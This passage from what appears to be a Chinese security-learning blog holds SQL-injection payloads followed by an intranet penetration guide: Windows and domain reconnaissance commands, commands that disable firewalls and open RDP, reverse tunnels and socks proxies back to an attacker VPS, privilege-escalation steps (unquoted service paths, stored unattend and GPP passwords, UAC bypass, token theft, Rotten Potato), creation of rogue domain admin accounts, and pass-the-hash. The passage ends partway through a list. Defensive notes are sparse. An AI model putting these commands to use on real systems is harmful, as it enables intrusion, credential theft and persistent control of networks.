<p>然后直接分析可以发现false和true并为true，true再和false并为false，false再和true并为true</p>
<h2 id="样例分析："><a href="#样例分析：" class="headerlink" title="样例分析："></a>样例分析：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">and 1=2 union select 1,2,3--</span><br><span class="line"></span><br><span class="line">select user() regexp &#x27;^ro&#x27;</span><br><span class="line"></span><br><span class="line">ascii(substr(select user()),1,1))=114</span><br><span class="line"></span><br><span class="line">if(ascii(substr((select user()),1,1))=114,0,sleep(5))</span><br><span class="line"></span><br><span class="line">(ascii(substr((select table_name from information_schema.t</span><br><span class="line">ables where table_schema=database() limit 0,1),1,1)=9)</span><br><span class="line"></span><br><span class="line">updataxml(1,concat(0x7e,(select @@version),0x7e),1)</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/15/trick/%E5%86%85%E7%BD%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/pic.jpg">
      <meta itemprop="name" content="D0gekong">
      <meta itemprop="description" content="散人的漫漫学习路">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hack the world">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/15/trick/%E5%86%85%E7%BD%91/" class="post-title-link" itemprop="url">内网信息搜集</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-03-15 13:12:35" itemprop="dateCreated datePublished" datetime="2022-03-15T13:12:35+08:00">2022-03-15</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-07-08 22:01:02" itemprop="dateModified" datetime="2022-07-08T22:01:02+08:00">2022-07-08</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h1><p>手动信息搜集:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all  查询网络配置信息</span><br><span class="line">systeminfo 查询系统信息/可以看当前域</span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%  查看系统体系结构</span><br><span class="line">wmic product get name,version 查看安装的软件以及版本，路径等</span><br><span class="line">wmic service list brief 查询本机服务信息</span><br><span class="line">tasklist 查询进程列表</span><br><span class="line">schtasks /query /fo LIST /v 查看计划任务</span><br><span class="line">net statistics workstation 查看主机开机时间</span><br><span class="line">net user 查询用户列表</span><br><span class="line">net localgroup administrator 获取本地管理员信息</span><br><span class="line">query user || qwinsta 查看当前在线用户</span><br><span class="line">net session 列出或断开本地计算机与所连接的客户端之间的会话</span><br><span class="line">netstat -ano 查询端口列表</span><br><span class="line">net share 查询本机共享列表</span><br><span class="line">关闭防火墙:</span><br><span class="line">	2003之前:netsh firewall set opmode disable</span><br><span class="line">	2003之后:netsh advfirewall set allprofiles state off</span><br><span class="line">netsh firewall show config 查看防火墙配置</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action =allow 允许3389端口放行</span><br><span class="line">开启3389:</span><br><span class="line">	2003中:wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br><span class="line">	2008和2012中:reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br><span class="line">whoami /all 获取域SID</span><br><span class="line">net user xxx /domain 查看指定用户的详细信息</span><br><span class="line">net config workstation 查看当前登录域以及登录用户信息</span><br><span class="line">net time /domain 三种情况</span><br><span class="line">	存在域，但是当前用户不是域用户，会出现拒绝访问</span><br><span class="line">	存在域，当前用户是域用户，会出现时间</span><br><span class="line">	不存在域，出现找不到域WORKGROUP的域控制器</span><br><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I |findstr &quot;TTL=&quot;</span><br><span class="line">net view /domain 查询域</span><br><span class="line">net view /domain:HACKE 查询域内所有计算机</span><br><span class="line">net group /domain 查询域内所有用户组列表</span><br><span class="line">net group &quot;domain computers&quot; /domain 查询所有域成员计算机列表</span><br><span class="line">net accounts /domain 获取域密码信息</span><br><span class="line">nltest /domain_trusts 获取域信任信息</span><br><span class="line">nltest /DCLIST:hacke 查看域控的机器名</span><br><span class="line">net group &quot;Domain Controllers&quot; /domain 查看域控制器组</span><br><span class="line">netdom query pdc 查看域控制器组</span><br><span class="line">wmic useraccount get /all 获取域内用户的详细信息</span><br><span class="line">dsquery user 查看存在的用户</span><br><span class="line">net localgroup administrators 查询本地管理员组用户</span><br><span class="line">net group &quot;domain admins&quot; /domain 查询域管理员用户</span><br><span class="line">net group &quot;Enterprise Admins&quot; /domain 查询管理员用户组</span><br><span class="line">net group &quot;Domain Admins&quot; /domain 获取域管理员列表</span><br><span class="line">tasklist /v 列出本机的所有进程及进程用户</span><br><span class="line">net group &quot;Domain Controllers&quot; /domain 查询域控制器列表</span><br><span class="line">net group &quot;Domain Admins&quot; /domain 收集域管理员列表</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="隐藏通信隧道"><a href="#隐藏通信隧道" class="headerlink" title="隐藏通信隧道"></a>隐藏通信隧道</h1><ul>
<li>网络层:IPv6隧道,ICMP隧道,GRE隧道</li>
<li>传输层:TCP隧道,UDP隧道,常规的端口转发</li>
<li>应用层:SSH隧道,HTTP隧道,HTTPS隧道,DNS隧道</li>
</ul>
<h2 id="ICMP隧道—网络层"><a href="#ICMP隧道—网络层" class="headerlink" title="ICMP隧道—网络层"></a>ICMP隧道—网络层</h2><p>使用PingTunner工具，在web服务器执行如下代码<code>ptunnel -x shuteer</code>，在VPS服务器中执行如下命令 <code>ptunnel -p web服务器ip -lp 1080 -da 服务器内网其他服务器IP -dp 服务器内网其他服务器端口 -x ch1e</code></p>
<ul>
<li>-x  指定隧道连接的验证密码</li>
<li>-lp 指定要监听的本地TCP端口</li>
<li>-da 指定要转发的模板机器的ip地址</li>
<li>-dp 指定要转发的目标机器的tcp端口</li>
<li>-p 指定icmp隧道另一端的机器的ip地址</li>
</ul>
<p>下面举个例子，比如 <code>ptunnel -p 192.168.1.4 -lp 1080 -da 1.1.1.10 -dp 3389</code>  ,上面这条命令就是在访问攻击者VPS的ip也就是192.168.1.5的1080端口，他会把数据库服务器1.1.1.10的3389端口的数据封装在ICMP隧道里，只需要访问192.168.1.5的1080端口即可连接1.1.1.10 的远程桌面</p>
<p>特征:会产生大量的ICMP数据包，会在所有ICMP payload前面加上TUNL标记</p>
<h2 id="端口转发—传输层"><a href="#端口转发—传输层" class="headerlink" title="端口转发—传输层"></a>端口转发—传输层</h2><h3 id="内网端口转发"><a href="#内网端口转发" class="headerlink" title="内网端口转发"></a>内网端口转发</h3><p>在公网vps上执行，把本地监听的4444端口转发到5555端口</p>
<p><code>lcx.exe -listen 4444 5555</code></p>
<p>目标机器执行，把目标机器3389端口的数据转发到公网4444端口上</p>
<p><code>lcx.exe -slave 公网主机ip地址 4444 127.0.0.1 3389</code></p>
<p>使用远程桌面登录 公网主机ip地址:5555即可访问目标服务器的3389端口</p>
<h3 id="本地端口映射"><a href="#本地端口映射" class="headerlink" title="本地端口映射"></a>本地端口映射</h3><p>如果目标服务器有防火墙限制，3389等端口数据无法通过，可以吧数据传到防火墙允许的其他端口，比如53</p>
<p><code>lcx.exe -tran 53 目标主机ip地址 3389</code></p>
<h2 id="SSH隧道—应用层"><a href="#SSH隧道—应用层" class="headerlink" title="SSH隧道—应用层"></a>SSH隧道—应用层</h2><h3 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h3><p>一般SSH协议是被运行通过防火墙和边界设备的，所以可以使用ssh协议开启隧道，主要参数如下</p>
<ul>
<li>-C:压缩传输，提高速度</li>
<li>-f:把ssh传输转入后台执行，不占用当前的shell</li>
<li>-N:建立静默链接，只是看不到会话</li>
<li>-g:允许远程主机连接本地用于转发的端口</li>
<li>-L:本地端口转发</li>
<li>-R:远程端口转发</li>
<li>-D:动态转发</li>
<li>-P:指定SSH端口</li>
</ul>
<p>Example:<code>ssh -CfNg -L VPS端口:目标主机:目标端口 root@跳板机ip(一般是web服务器ip)</code></p>
<h3 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h3><p>以web服务器为跳板，把VPS的3307端口的流量转发到1.1.1.10的3389端口，然后访问VPS的3307端口 ，就可以访问到1.1.1.10的3389端口了</p>
<p><code>ssh -CfNg -R 3307:1.1.1.10:3389 root@192.168.1.4</code></p>
<p>防御思路：在ACL中限制只有特定的IP地址才能连接ssh</p>
<h2 id="HTTP-HTTPS隧道—应用层"><a href="#HTTP-HTTPS隧道—应用层" class="headerlink" title="HTTP/HTTPS隧道—应用层"></a>HTTP/HTTPS隧道—应用层</h2><p>常见的代理工具有reGeorg,meterpreter，tunna等</p>
<p>reGeorg支持ASPX PHP JSP等Web脚本，首先得把脚本文件上传到目标服务器上，然后运行以下命令</p>
<p><code>python reGeorgSocksProxy.py -u http://192.168.184.149:8080/tunnel.jsp -p 9999</code></p>
<p>然后可以使用类似ProxyChains之类的工具</p>
<h2 id="Socks代理"><a href="#Socks代理" class="headerlink" title="Socks代理"></a>Socks代理</h2><p>EarthWorm：ew</p>
<h3 id="普通网络环境"><a href="#普通网络环境" class="headerlink" title="普通网络环境"></a>普通网络环境</h3><p>正向socks5服务器：</p>
<p><code>ew -s ssocksd -l 888</code> 执行上述命令，即可架设一个端口为888的socks代理</p>
<p>反向socks5服务器:</p>
<p>在个人公网vps上输入如下命令: </p>
<p><code>ew -s rcsocks -l 1080 -e 888</code>  在 1.1.1.1 的公网主机添加转接隧道，将 1080 收到的代理请求转交给反连 888 端口的主机</p>
<p>在Web服务器上使用如下命令:</p>
<p><code>ew -s rssocks -d 1.1.1.1 -e 888</code> 1.1.1.1是个人的公网vps的IP，将目标网络的可控边界主机反向连接公网主机1.1.1.1</p>
<p>所以我们可通过访问 1.1.1.1:1080 端口使用 rssocks 主机提供的 socks5 代理服务</p>
<h3 id="二重网络环境"><a href="#二重网络环境" class="headerlink" title="二重网络环境"></a>二重网络环境</h3><p>对于二重网络环境：<br>    1.  获得目标网络内两台主机 A、B 的权限，情况描述如下：</p>
<pre><code>        A 主机：  存在公网 IP，且自由监听任意端口，无法访问特定资源
        B 主机：  目标网络内部主机，可访问特定资源，但无法访问公网
        A 主机可直连 B 主机
        
                                可控边界主机A             可访问指定资源的主机B
          +---------+     +-----------------------+      +-----------------+
          |HackTools| -&gt;&gt; | 1080 --&gt;  2.2.2.2 --&gt; | -&gt;&gt;  | 9999 -&gt; 2.2.2.3 |
          +---------+     +-----------------------+      +-----------------+

        a)  ./ew -s ssocksd -l 9999
                // 在 2.2.2.3 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理
        b)  ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999 
                // 将 1080 端口收到的 socks 代理请求转交给 2.2.2.3 的主机。
        c)  HackTools 可通过访问 2.2.2.2:1080 来使用 2.2.2.3 主机提供的 socks5 代理。
        
2.  获得目标网络内两台主机 A、B 的权限，情况描述如下：

        A 主机：  目标网络的边界主机，无公网 IP，无法访问特定资源。
        B 主机：  目标网络内部主机，可访问特定资源，却无法回连公网。

        A 主机可直连 B 主机
                              一台可控公网IP主机                    可控内网主机A         可访问指定资源的主机B
          +---------+     +--------------------------+    |    +-----------------+      +-----------------+
          |HackTools| -&gt;&gt; | 1080 -&gt;  1.1.1.1 -&gt; 8888 |  防火墙  | &lt;--  2.2.2.2 --&gt; | -&gt;&gt; | 9999 -&gt; 2.2.2.3 |
          +---------+     +--------------------------+    |    +-----------------+      +-----------------+

        a)  ./ew -s lcx_listen -l 1080 -e 8888
                    // 在 1.1.1.1 公网主机添加转接隧道，将 1080 收到的代理请求
                    // 转交给反连 8888 端口的主机
        b)  ./ew -s ssocksd -l 9999
                    // 在 2.2.2.3 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理
        c)  ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
                    // 在 2.2.2.2 上，通过工具的 lcx_slave 方式，打通1.1.1.1:8888 和 2.2.2.3:9999 之间的通讯隧道
        d)  HackTools 可通过访问 1.1.1.1:1080 来使用 2.2.2.3 主机提供的 socks5 代理
</code></pre>
<h2 id="判断是否出网"><a href="#判断是否出网" class="headerlink" title="判断是否出网"></a>判断是否出网</h2><ul>
<li>ICMP:ping baidu.com</li>
<li>TCP:nc -zv xxx.xxx.xxx.xxx</li>
<li>HTTP:curl <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a></li>
<li>DNS:nslookup <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> vps-ip</li>
</ul>
<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="权限介绍"><a href="#权限介绍" class="headerlink" title="权限介绍"></a>权限介绍</h2><p>User:普通用户权限，系统中最安全的权限</p>
<p>Administrator:管理员权限，可以提升为System权限，方便操作SAM文件</p>
<p>System:系统权限</p>
<p>TrustedInstaller:Windows中的最高权限，只有这个权限才能修改系统文件</p>
<h2 id="提权方法"><a href="#提权方法" class="headerlink" title="提权方法"></a>提权方法</h2><ul>
<li>系统内核溢出漏洞提权</li>
<li>数据库提权</li>
<li>错误的系统配置提权</li>
<li>组策略首选项提权</li>
<li>Web中间件漏洞提权</li>
<li>DLL劫持提权</li>
<li>滥用高权限令牌提权</li>
<li>第三方服务/软件提权</li>
</ul>
<h3 id="系统内核溢出漏洞提权"><a href="#系统内核溢出漏洞提权" class="headerlink" title="系统内核溢出漏洞提权"></a>系统内核溢出漏洞提权</h3><p>如果没有及时打补丁，我们就可以找到对应的exp进行提权</p>
<p>首先可以输入命令<code>systeminfo</code>，然后放到Windows提权辅助工具里寻找可用的exp即可</p>
<p>防御方法:打好补丁</p>
<h3 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h3><p>Windows系统服务文件在操作系统启动时加载和执行，并在后台调用可执行文件，如果一个低权限用户对此类系统服务调用的可执行文件拥有写权限，就可以把该文件替换成任意可执行文件，并随着系统服务器的启动获得可执行权限。</p>
<p>存在下面两种可能:</p>
<ul>
<li>服务未运行，攻击者使用任意服务替换原来的服务，然后重启服务</li>
<li>服务正在运行并且无法终止，攻击者通常会利用DLL劫持尝试重启服务来提权</li>
</ul>
<p>我们可以使用Metasploit，对应的利用模块是service_permissions 选择AGGRESSIVE选项，可以利用目标机器上每一个有缺陷的服务。</p>
<h3 id="注册表键AlwaysInstallElevated"><a href="#注册表键AlwaysInstallElevated" class="headerlink" title="注册表键AlwaysInstallElevated"></a>注册表键AlwaysInstallElevated</h3><p>注册表键AlwaysInstallElevated是有个策略设置项，Windows允许低权限用户以System权限允许安装文件，如果启动此选项，任何权限的用户都能以NT/AUTHORITY安装msi文件。</p>
<p>漏洞产生原因:开启了Windows Instaler特权安装功能</p>
<h3 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h3><p>可信任服务路径(包含空格且没有引号的路径)利用了Windows文件路径解析的特性，并涉及服务路径/文件夹权限。如果一个服务调用的可执行文件没有正确的处理所引用的完整路径名，这个漏洞就可以被攻击者用来上传任意可执行文件。</p>
<p>这里主要介绍MSF下的实战利用</p>
<p><code>wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</code> </p>
<p>然后检测是否有对目标文件夹的写入权限，使用Windows内置的icacls根据，依次检查上一步输出的路径，会发现有些目录后有Everyone:(OI)(CI)(F)字样</p>
<ul>
<li>Everyone:用户对这个文件夹有完全控制权限，所有用户都具有修改这个文件夹的权限</li>
<li>(M)：修改</li>
<li>(F)：完全控制</li>
<li>(CI)：从属容器将继承访问控制项</li>
</ul>
<p>Everyone:(OI)(CI)(F)的意思就是用户对这个文件夹有读，写，删除其下文件，删除子目录的权限</p>
<p>确认目标机器中存在此漏洞后，把要上传的程序重命名并且放置在存在此漏洞且科协的目录下，执行以下命令，尝试重启服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop service_name</span><br><span class="line">sc start service_name</span><br></pre></td></tr></table></figure>

<p>也可以使用Metasploit中的Windows Service Trusted Path Privilege Escalation模块</p>
<h3 id="自动安装配置文件"><a href="#自动安装配置文件" class="headerlink" title="自动安装配置文件"></a>自动安装配置文件</h3><p>网络管理员在多台机器配置同一个环境时，通常不会逐台配置，会使用批量部署的方法，在这过程中会安装配置文件，包含所有安装配置信息。</p>
<ul>
<li>C:\sysprep.ini</li>
<li>C:\sysprep\sysoreo.xml</li>
<li>C:\Windows\system32\sysprep.inf</li>
<li>C:\Windows\system32\sysprep\sysprep.xml</li>
<li>C:\unattend.xml</li>
<li>C:\Windows\Panther\Unattend.xml</li>
<li>C:\Windows\Panther\Unattended.xml</li>
<li>C:\Windows\Panther\Unattend\Unattended.xml</li>
<li>C:\Windows\Panther\Unattend\Unattend.xml</li>
<li>C:\Windows\System32\Sysprep\unattend.xml</li>
<li>C:\Windows\System32\Sysprep\Panther\unattend.xml</li>
</ul>
<p>也可以执行如下命令进行搜索</p>
<p><code>dir /b /s c:\Unattend.xml</code></p>
<p>Metasploit中集成了该漏洞的利用模块post/windows/gather/enum_unattend</p>
<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>可以用如下命令查看计算机的计划任务</p>
<p><code>schtasks /query /fo LIST /v</code></p>
<p>我们可以查询当前权限对高权限运行的任务所在的目录是否有可写权限，如果有就可以使用恶意程序来覆盖原来的程序，这样在计划任务下次执行时，就会以高权限来运行恶意程序</p>
<p>可以使用AccessChk是微软官方提供的一个工具，不会引起杀软的报警</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">列出某个驱动器下所有权限配置有缺陷的文件夹</span><br><span class="line">	accesschk.exe -uwdqsUsersc:\</span><br><span class="line">	accesschk.exe -uwdqs&quot;AuthenticatedUsers&quot;c:\*.*</span><br><span class="line">列出某个驱动器下所有权限配置有缺陷的文件</span><br><span class="line">	accesschk.exe -uwqsUsersc:\*.*</span><br><span class="line">	accesschk.exe -uwqs“AuthenticatedUsers”c:\*.*</span><br></pre></td></tr></table></figure>

<h4 id="at命令"><a href="#at命令" class="headerlink" title="at命令"></a>at命令</h4><p>Windows Server 2008之前版本使用，使用at创建计划任务流程如下</p>
<ul>
<li>使用<code>net time</code>确定远程机器当前的系统时间</li>
<li>使用copy命令把Payload文件复制到远程目标机器中</li>
<li>使用at命令定时启动Payload文件</li>
<li>删除使用at命令创建计划任务的记录</li>
</ul>
<p>具体命令执行流程如下:</p>
<ul>
<li>net time \\192.168.100.1</li>
<li>copy calc.bat\ \192.168.100.1\C$</li>
<li>at \\192.168.100.1 4:44PM C:\calc.bat Added a new job with job ID=7</li>
<li>at \\192.168.100.1 7 /delete</li>
</ul>
<h4 id="schtasks命令"><a href="#schtasks命令" class="headerlink" title="schtasks命令"></a>schtasks命令</h4><p>Windows Server2008后不使用at命令，使用schtasks命令代替at命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在远程主机上创建一个名称为test的计划任务，在开机时启动，启动权限是system</span><br><span class="line">	schtasks /create /s 192.168.100.1 /tn test /sc onstart /tr c:\calc.bat /ry system /f</span><br><span class="line">执行计划任务</span><br><span class="line">	schtasks /run /s 192.168.100.1 /i /tn &quot;test&quot;</span><br><span class="line">删除计划任务</span><br><span class="line">	schtasks /delete /s 192.168..100.1 /tn &quot;test&quot; /f</span><br><span class="line">删除ipc$</span><br><span class="line">	net use 名称 /del /y</span><br></pre></td></tr></table></figure>

<h3 id="组策略首选项"><a href="#组策略首选项" class="headerlink" title="组策略首选项"></a>组策略首选项</h3><p>一般的域环境所有机器都是脚本化自动部署，为了方便对所有的机子进行操作，会使用组策略进行统一的管理和配置，管理员可以通过组策略统一修改密码，但是如果这样，那所有的机子的管理员密码都是相同的，我们只要获取一台的本地管理员密码，那么就相当于获得了域中所有机器的本地管理员密码</p>
<p>常见的组策略首选项</p>
<ul>
<li>映射驱动器</li>
<li>创建本地用户</li>
<li>数据源</li>
<li>打印机配置</li>
<li>创建/更新服务</li>
<li>计划任务</li>
</ul>
<p>管理员在域中更新一个组策略以后，操作系统会自动在SYSVOL共享目录中生成一个xml文件，该文件保存了该组策略更新后的密码，使用了AES-256加密算法，但是由于微软在2012年公开了该密码的密钥，导致密码的安全性降低</p>
<p>我们可以直接找到包含cpassword的xml文件,对密文进行解密</p>
<p>防御方法:</p>
<ul>
<li>安装KB2962486补丁</li>
<li>设置共享文件夹Everyone的访问权限</li>
<li>把包含组策略密码的Xml文件中SYSVOL的目录中删除</li>
<li>不要把密码放在所有域用户都有权访问的文件中</li>
<li>如果需要更改域中机器的本地管理员密码，建议使用LAPS</li>
</ul>
<h3 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h3><p>计算机的操作系统版本大于Windows Vista或更高，在权限不够的情况下， 访问系统磁盘的根目录，Windows目录，Program Files目录，以及读，写系统登录数据库的程序等操作，需要经过UAC(User Account Control)的认证</p>
<p>UAC有四种设置要求，始终通知，仅在程序视图更改我的计算机时通知，仅在程序视图更改我的计算机时候通知我(不降低桌面亮度)，从不提示</p>
<p>仅在程序视图更改我的计算机时通知是默认情况</p>
<p>假设我们经过前提的渗透测试已经获得到了目标的meterpreter的shell，当前权限为普通用户，如果我们尝试获取系统的System权限，可以先运行exploit/windows/local/bypassuac模块，然后执行getsystem(在使用这个模块的时候当前用户必须在管理员组中，UAC必须为默认设置)</p>
<p>也可以使用RunAs模块，使用exploit/windows/local/ask模块，在弹出的uac对话框中选择是，即可，要求是当前用户在管理员组或知道管理员的密码，对UAC无要求，需要使用EXE::Custom选项创建一个可执行文件，需要进行免杀处理</p>
<h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><p>令牌是系统中的临时密钥，相当于账号和密码，有了令牌就可以在不提供密码或者其他凭证的情况下访问网络和系统资源，他的特地是随机性和不可预测性，访问令牌(Access Token)代表访问控制操作主体的系统对象，密保令牌(Security Token)叫认证令牌或者硬件令牌，是一种实现计算机身份校验的物理设备，比如U盾，会话令牌(Session Token)是交互会话中唯一的身份标识符</p>
<p>伪造令牌的核心是kerberos协议，首先是客户端向服务端请求证书，认证服务器收到请求，把包含密钥的加密证书给客户端，该证书包含了服务器Ticket和一个临时加密密钥，也会向服务器发送一份证书，使服务器可以验证客户端身份，客户端把Ticket给服务器，如果服务器确认客户端身份，就允许登录，客户端登录服务器以后，攻击者就可以通过入侵服务器来窃取客户端的令牌</p>
<p>假设获取到了目标机器的meterpreter shell，首先输入 <code>user incognito</code>,然后输入 <code>list_tokens -u</code>,列出可用的令牌，有两种类型的令牌，一种是Delegation Tokens，就是授权令牌，支持交互式登录，另外一种是Impersonation Tokens，也就是模拟令牌，支持非交互式的会话，令牌数量取决于meterpreter shell的访问级别，然后调用impersonate_token就可以假冒用户了，比如<code>impersonate_token WIN-xxx//Administrator</code></p>
<h3 id="Rotten-Potato"><a href="#Rotten-Potato" class="headerlink" title="Rotten Potato"></a>Rotten Potato</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">把rottenpotato.exe上传到目标服务器</span><br><span class="line">execute -HC -f rottenpotato.exe</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br></pre></td></tr></table></figure>

<h3 id="添加域管理员"><a href="#添加域管理员" class="headerlink" title="添加域管理员"></a>添加域管理员</h3><p>拿到meterpreter shell以后输入ps，找到域管理进程，使用migrate 迁移到这个进程，输入shell进入控制行界面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user ch1e ch1esec /ad /domain     添加域用户</span><br><span class="line">net group &quot;domain admins&quot; ch1e /ad /domain	  添加到域管理员组</span><br><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure>

<p>同样，在meterpreter中可以使用incognito来模拟域管理员，通过迭代系统中所有可用的身份验证令牌来添加域管理员</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在活动的meterpreter中执行如下命令， 在域控主机上添加一个账号</span><br><span class="line">add_user ch1e ch1esec -h 1.1.1.2</span><br><span class="line">执行如下命令，把账户添加到管理员组中</span><br><span class="line">add_group_user &quot;Domain Admins&quot; ch1e -h 1.1.1.2</span><br></pre></td></tr></table></figure>

<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="IPC-Internet-Process-Connection"><a href="#IPC-Internet-Process-Connection" class="headerlink" title="IPC(Internet Process Connection)"></a>IPC(Internet Process Connection)</h2><p>通过$IPC，可以与目标机器建立连接，可以访问目标机器的文件，进行上传和下载操作，还可以运行其他命令</p>
<p>首先需要建立一个IPC连接，<code>net use \\IP\ipc$ &quot;密码&quot; /user:&quot;administrator&quot;</code>，可以使用<code>net use</code> 查看已经建立的连接</p>
<p>利用条件:开启了139，445端口，通过139，445端口，可以实现对共享文件/打印机的访问，并且管理员需要开启默认共享</p>
<h2 id="PTH-Pass-The-Hash"><a href="#PTH-Pass-The-Hash" class="headerlink" title="PTH(Pass The Hash)"></a>PTH(Pass The Hash)</h2><p>拿到某个机子的NTLM hash，就可以拿这个NTLM进行远程登录，原理其实是Windows内部不保存明文密码，只保存密码的hash值，本机用户的密码hash是放在<code>%SystemRoot%\System32\config\SAM</code>里，域内用户的密码存放在域控的<code>C:\Windows\NTDS\NTDS.dit</code>文件里，在使用CS时常见到以下情况的hash</p>
<p><code>Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</code></p>
<p>windows中hash结构一般为<code>username:RID:LM-hsah:NTLM-hash</code>，AAD3B435B51404EEAAD3B435B51404EE是LM Hash，31D6CFE0D16AE931B73C59D7E0C089C0是NTLM Hash这里的话LM加密算法不进行介绍，只在2000 XP 2003系统中有，从Windows Vista 和 Windows Server 2008开始默认只存储NTLM Hash，如果密码是空或者不存储LM Hash的话，这里的LM Hash都是AAD3B435B51404EEAAD3B435B51404EE，NTLM的算法如下</p>
<ul>
<li>先把用户名密码转换成16进制</li>
<li>把16进制格式的密码进行Unicode编码</li>
<li>使用MD4对Unicode编码数据进行Hash计算</li>
</ul>
<p><img src="https://raw.githubusercontent.com/ch0x01e/image/main/img/image-20220313220800398.png" alt="image-20220313220800398"></p>
<p>这里标注了大概过程</p>
<ol>
<li>用户登录客户端电脑</li>
<li>客户端向服务器发送协商消息，包含客户端支持和服务器请求的功能列表</li>
